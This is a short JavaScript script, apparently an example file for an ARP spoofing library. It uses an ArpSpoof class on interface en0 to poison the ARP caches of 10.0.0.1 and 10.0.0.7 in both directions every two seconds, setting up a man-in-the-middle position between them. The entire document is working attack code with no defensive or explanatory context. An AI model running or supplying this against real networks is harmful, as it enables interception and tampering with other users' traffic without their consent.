import {ArpSpoof} from "../spoof";

(async () => {
    const arpSpoof = new ArpSpoof('en0');

    setInterval(async () => {
        await arpSpoof.poison('10.0.0.1', '10.0.0.7');
        await arpSpoof.poison('10.0.0.7', '10.0.0.1');
    }, 2 * 1000);
})();
